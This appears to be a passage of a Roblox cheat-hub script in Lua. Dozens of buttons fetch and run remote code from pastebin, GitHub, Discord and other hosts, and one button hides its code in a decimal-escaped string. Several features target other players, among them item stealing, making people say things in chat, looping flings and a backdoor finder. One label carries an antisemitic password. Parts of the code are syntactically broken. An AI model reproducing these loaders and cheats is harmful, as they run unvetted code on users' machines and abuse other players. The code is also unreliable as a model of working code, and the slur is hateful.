Main_:CreateButton("Hammer", "Oversized Hammer of the Titans", "Red Roblox Cap", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/MfLmztAC"))()
end)

Main_:CreateButton("Double Barrel Shotgun", "DB12 [Left Hip]", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ZZLtusFM"))()
end)

Main_:CreateButton("Block Gun", "Pal Hair", "Red Roblox Cap", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/crVVpKFa"))()
end)

Main_:CreateButton("Hoverboard", "Flaming Mohawk", "Brown Hair", "Pal Hair", "Lavender Updo", "Chesnut Bun", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xSNp0dKd"))()
end)

Main_:CreateButton("Abyss Eye", "Demonic Greatsword", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/shrVqzAX"))()
end)

Main_:CreateButton("Smile", "ROBLOX Girl - Hair", "Chestnut Bun", "Brown Hair", "Pal Hair", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/5QQe8FHt"))()
end)

Main_:CreateButton("Pog Dance", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/vYhAqnKn"))()
end)

Main_:CreateButton("Darth Vader", "Saber Simulator: Red Light Saber", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/61ctwEy1"))()
end)

Main_:CreateButton("Guts", "Slasher", "Fan Hand Sign - Why Don't We (WDW)", "International Fedora - Germany", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/BErqYgmC"))()
end)

Main_:CreateButton("Grand Master", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/jetfya03"))()
end)

Main_:CreateButton("Food Grill", "Grill", "Burger Bob", "Grilled Sausage", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Tj1tjdZW"))()
end)

Main_:CreateButton("Toggle Fling (X)", "", function()
	_G.KeyCode = "X"
	loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
end)

Main_:CreateButton("Rocket Launcher", "Le Rouge Cross-body Bag 1.0", "Nike Shoebox Costume", "Head Slime", "Spider Cola", "The Bird Says____.", function()
	loadstring(game:HttpGet(("https://gist.githubusercontent.com/redmoons1/4ae7d132cdfe8dba6ab2081e38ca1f8b/raw/ca9b6c1b2bad7589bad72aeaec720ad18890b702/rocket launcher"),true))()
end)

Main_:CreateButton("Prison Life", "", function()
	loadstring(game:HttpGet("https://pastebin.com/raw/LnAUPBXj",true))()
end)

Main_:CreateButton("Slasher", "Slasher", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/qQk2MB7R"))()
end)
end)
Section:NewButton("Sussy Hub","",function()
loadstring(game:HttpGet(('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub'),true))();
end)
Section:NewButton("GelatekHub","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatekussy/GelatekHub/main/Main.lua"))()
end)
Section:NewButton("SimplityV2","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/simplityv2/main/main"))()
end)
Section:NewButton("Userful HUB","",function()
loadstring(game:HttpGet("https://www.klgrth.io/paste/zqt4x/raw"))()
end)

Section:NewButton("BritishHubV8 (key: Jewssuck1)","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/British%20Hub%20v8"))()
end)

Section:NewButton("HubZ(Animation)", "All animation", function()
loadstring(game:HttpGet("https://textbin.net/raw/k3sjvw3vrq"))();
end)

Section:NewButton("DevilHubV1", "Really new ok", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Fuad3681/Devil-hub-11/main/Devil%20Hub%2011"))()
end)

Section:NewButton("DizigiHubV1.01", "new but kinda op", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/Loadstring/main/Dzigi%20HubV1.01"))()
end)

Section:NewButton("Feyz Hub", "", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FeyzRBLX/FeyzHub/main/Feyz%20Hub%20V2"))()
end)

Section:NewButton("MRDestroyer V2", "So Op then mine lol", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrDestroyerSkid/Project-Destroyer/main/Destroyer"))()
end)

Section:NewButton("FireHubV1", "Awesome New gui", function()
loadstring(game:HttpGet('https://pastebin.com/raw/REuMknBd', True))()
end)

Section:NewButton("PendulumHub", "Fe hub i think", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V4.lua"))()
end)

Section:NewButton("Pritish Hub V1", "Damn British And Prohub working", function()
loadstring(game:HttpGet(('https://cdn.discordapp.com/attachments/996659065096765502/996659173213343804/out.lua'),true))()
end)

Section:NewButton("Era Hub", "Loads a gui with some features", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/zRWQnNjS'))()
end)

Section:NewButton("itzzJoshua_V3", "Gui or Hub idk", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/gMCev4Gb'),true))();
end)

Section:NewButton("British Hub V6", "Almost like Prohub", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/BHob6"),true))()
end)

Section:NewButton("Time Controller Gui", "Time", function()
loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()
end)

Section:NewButton("Shards Gui", "Op And new", function()
local Library  = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Shards Gui made by exe_crusader aka paradox", "GrapeTheme")
-- Main
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Simple Scripts")

loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
Mainsection:NewToggle("Mega Jump", "now you can jump high like you're on the moon", function(state)
    if state then
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100 
    else
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    end
end)

PlayerSection:NewToggle("SimpleSpeed", "You go fast but not to fast", function(state)
    if state then
       game.LocalPlayer.Character.Humanoid.WalkSpeed = 120
    else
        game.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    end
end)

PlayerSection:NewButton("Inf Yield", "Fe Admin Commands", function()
    loadstring.game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source')()
end)


--LOCAL PLAYER
local Player = Window:NewTab("Player")
local PlayerSection = Player:NewSection("Player")

PlayerSection:NewSlider("Walkspeed", "zoom past anything", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

PlayerSection:NewSlider("JumpPower", "Jump really high ", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

PlayerSection:NewButton("Reset WS/JP", "Rests Walkspeed and jumpPower to default", function()
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)

--Other 
local Other = Window:NewTab("Other")
local OtherSection = Other:NewSection("Other")

OtherSection:NewButton("Fly Gui", "Gives you a fly gui",function()
    loadstring.game:HttpGet('https://pastebin.com/raw/LXq36kRU')()

end)
end)

local Tab = Window:NewTab("Others Scripts")
local Section = Tab:NewSection("Scripts")

Section:NewButton("Small Fling Gui", "Loads a small fling gui", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
end)

Section:NewButton("BackDoorFinder", "Finds a Backdoor for admin or additional scripts", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
end)

Section:NewButton("Speed Gui", "Loads a gui with speed control", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/PrototypeRBLX/Speed-Script/main/README.md'),true))()
end)

Section:NewButton("Moon Gui", "Loads a Big gui with tons of scripts", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10'))()
end)

Section:NewSlider("WalkSpeed", "Run really fast", 500, 10, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Section:NewSlider("JumpPower", "Jump really high ", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Section:NewButton("Speed Tool", "Gives you a tool to speed up", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/iShZQHw7'))()
end)

Section:NewButton("EarRape", "Click to play all sounds in the game you're in at once", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/nZjJq2wJ"))()
end)

Section:NewButton("Animation Gui", "Loads a gui with animations to use", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/0MLPL32f"))()
end)

Section:NewButton("Invisible Gui", "Loads a gui that makes you invisible", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AYtzGEPb'))()
end)

Section:NewButton("Annoy people Gui", "loads a gui to annoy players with", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/ZME5dX7w'))()
end)

Section:NewButton("Infinite Jump", "lets you jump forever", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/KpT16qBg'))()
end)

Section:NewButton("UpDown gui", "jumps to the postition or number you type", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/UpDown'))()
end)

Section:NewButton("Era Hub", "Loads a gui with some features", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/zRWQnNjS'))()
end)

Section:NewButton("Auto rap battle Gui", "loads a gui for the game", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/3dh0d3ya'))()
end)

Section:NewButton("R6 Troll Gui", "loads a gui to troll players", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/FS0hUuJg'))()
end)

Section:NewButton("Fe tall Script", "must be tall first", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Lix6q0PD'))()
end)

Section:NewButton("Anti Afk Gui", "never get kicked out again", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nadir3709/Huubb/main/Mobile%20Scripting"))()
end)

Section:NewButton("Anti Fling", "never get flung again", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/hKfDWcJw'))();
end)

Section:NewButton("Game Teleport", "loads a gui that allows you to tp to games", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/hiWAdBMa'))()
end)

Section:NewButton("Walk/Run gui", "loads a gui to Run/Walk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/72EKEHqC'))()
end)

Section:NewButton("R6 Climb on walls", "lets you climb on any walls", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/jLVhHEVW'))()
end)

Section:NewButton("Body Part Destroyer Gui", "fe and destroys your body parts", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/eE0PQ7jk'))()
end)

Section:NewButton("Super Tools", "gives you cool tools to use", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sQWeMuB0'))()
end)

Section:NewButton("Fe Fake Death", "you're dead", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/kjxNZCfb'))()
end)

Section:NewButton("R15 Fe just legs", "just legs", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Cj2Tm82A'))()
end)

Section:NewButton("R6 upside down", "makes your roblox player go upside down", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/e1xMVyWb'))()
end)

Section:NewButton("Freeze mode", "Gives you tools to freeze yourself just tap", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/AkJS0PC7'))()
end)

Section:NewButton("Op gui", "loads a really op gui", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/JLPe0B3H'),true))();
end)

Section:NewButton("Teleport gui", "loads a gui that lets you tp to players", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
end)

Section:NewButton("Infinite Yield 2", "loads admin v.2", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/nwWRBrnJ'))()
end)

Section:NewButton("Dupe Tools Gui", "loads a gui to dupe tools", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Dupe%20Tools%20Main%20Script.md'))()
end)

Section:NewButton("Send Hat Gui", "loads a gui for you to send you're hat", function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/dAy5u2hX'),true))()
end)

Section:NewButton("Position Reader Gui", "loads a gui showing you're position", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/55yDd1UZ'))()
end)

Section:NewButton("Keyboard Gui", "loads a gui with a functional keyboard", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/mtPcjSNQ'))()
end)

Section:NewButton("Jump Button Gui", "loads a jump button", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/qhBY6frK'))();
end)

Section:NewButton("Realistic Shader", "makes graphics much more realistic", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/uqD7VqQU'))()
end)

Section:NewButton("Emote Gui", "loads a fe gui that has different emotes for you to use", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fitjHU5J'))()
end)

Section:NewButton("Chat hack Gui", "loads a gui to make people say stuff", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
end)

Section:NewButton("Server Finder Gui", "loads a gui that finds servers", function()
    loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
end)

Section:NewButton("Walk on walls", "makes you walk on walls", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

Section:NewButton("Spectate Gui", "loads a gui that allows you to spectate players", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
end)

Section:NewButton("Black and White Shader", "makes everything black and white", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/KvJDt5Zw'))()
end)

Section:NewButton("Red Ghost Hub", "loads a fe op gui", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/WFKSRG6m'))();
end)

Section:NewButton("WALK/RUN tools", "gives you tools to run/walk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/9gKCGSPh'))()
end)

Section:NewButton("Ez Hub", "loads Ez Hub", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/K4xkQZpv'))()
end)

Section:NewButton("Local PLayer Gui", "loads the gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Retroapple/Roblox-Hack-Scripts/main/retroapple-universal"))();
end)

Section:NewButton("Netless", "makes your avatar more stable", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/7Jtggrqx'))()
end)

Section:NewButton("GreenScreen gui", "not fe but perfect for videos", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Green%20Screen'))()
end)

Section:NewButton("Custom HitBox", "you can customize the hitbox not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/HitBox%20Costumizer%20v2'))()
end)

Section:NewButton("Time Stop button", "lets you stop time not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/djAd7g2W'))()
end)

Section:NewButton("Realistic Shader GUI", "loads a gui that lets you change the shaders not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()
end)

Section:NewButton("Telescope gui", "loads a telescope gui not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/8T0STS4f'))()
end)

local Tab = Window:NewTab("Op Scripts")
local Section = Tab:NewSection("Good Scripts")
Section:NewButton("LigtPet", "gives you a pet that has a light not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Light%20Part%20Pet'))()
end)

Section:NewButton("Op fling", "if you're on mobile use noclip", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/JekRhmf5'))()
end)

Section:NewButton("Fly Gui", "best fly gui", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/6dvYSb6r'))()
end)

Section:NewButton("Turn into a bird", "you need tweetbird for it to work", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/fdPHLrDb'))()
end)

Section:NewButton("R6 pose gui", "loads a gui for posing fe btw", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sZMn81tZ'))()
end)

Section:NewButton("Part fly", "gives you tools to fly not fe", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Part%20Fly%20Bypass'))()
end)
Section:NewButton("Clone script", "clones you're avatar not fe", function()
    loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)()
end)

Section:NewButton("R6 Avatar", "makes your avatar a npc not fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/MtjAKQqH'))()
end)

Section:NewButton("Fake kick", "when people leave it makes them think you kicked them", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/9H4EGzHg'))()
end)

Section:NewButton("Loop Fling all", "automatically flings people", function()
    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
end)

Section:NewButton("R15 Leg resize", "you become really tall", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg%20Resize'))()
end)

Section:NewButton("Steal people's items", "press again to steal more items", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/01cGQZet'))()
end)

Section:NewButton("Legon Hub", "Op hub with alot of scripts", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/B1cUSJsv'))()
end)



local Tab = Window:NewTab("Others Hubs")
local Section = Tab:NewSection("Hubs")

Section:NewButton("Dodo Hub", "Has 10 Game Scripts", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/albibos/dodobird/main/openhub"))()
end)

Section:NewButton("MegaHub(30+ Feature)", "Almost like our but we have more", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/WholeF00ds/Mega/main/Obfuscated%20Loader'),true))()
end)

Section:NewButton("LegonX Hub", "New and Op", function()
loadstring(game:HttpGet(('https://pastebin.com/raw/Lmaz8vF7'),true))();
end)

Section:NewButton("Melon Hub", "Op but old lol", function()

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 22, 1)
Frame.Position = UDim2.new(0.352027595, 0, 0.363528013, 0)
Frame.Size = UDim2.new(0, 441, 0, 228)
Frame.Active = true
Frame.Draggable = true


TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 247, 1)
TextButton.Position = UDim2.new(0.335591137, 0, 0.416546434, 0)
TextButton.Size = UDim2.new(0, 117, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "blox fruit"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/jnCqHQXK", true))()
end)

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(243, 255, 5)
TextButton_2.Position = UDim2.new(0.335019827, 0, 0.69724822, 0)
TextButton_2.Size = UDim2.new(0, 117, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "mole hub"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000
TextButton_2.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/jnCqHQXK", true))()
end)


TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(251, 255, 0)
TextButton_3.Position = UDim2.new(0.622088015, 0, 0.429704338, 0)
TextButton_3.Size = UDim2.new(0, 117, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "animefighters"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000
TextButton_3.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/NBQKENww'),true))()
end)

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(247, 255, 226)
TextButton_4.Position = UDim2.new(0.622088015, 0, 0.6941064, 0)
TextButton_4.Size = UDim2.new(0, 117, 0, 50)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "ninjalegendsguis"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000
TextButton_4.MouseButton1Down:connect(function()
	pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2UjrXwTV")))
end)

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
TextButton_5.Position = UDim2.new(0.0411978364, 0, 0.695726931, 0)
TextButton_5.Size = UDim2.new(0, 117, 0, 50)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "moon hub"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 14.000
TextButton_5.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/Gae7YC84", true))()
end)

TextButton_6.Parent = Frame
TextButton_6.BackgroundColor3 = Color3.fromRGB(251, 255, 6)
TextButton_6.Position = UDim2.new(0.0430741608, 0, 0.419411153, 0)
TextButton_6.Size = UDim2.new(0, 117, 0, 50)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "true pice"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 14.000
TextButton_6.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/mkMhjUGn", true))()
end)


TextButton_7.Parent = Frame
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 29, 0)
TextButton_7.Position = UDim2.new(0.106124014, 0, -0.0048931241, 0)
TextButton_7.Size = UDim2.new(0, 332, 0, 50)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "hello this was made by alex and mole and frostify"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 26, 19)
TextLabel.Position = UDim2.new(-0.000166296959, 0, -0.000935748219, 0)
TextLabel.Size = UDim2.new(0, 69, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "v.1"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 51, 10)
TextLabel_2.Position = UDim2.new(0.845329523, 0, -0.000935748219, 0)
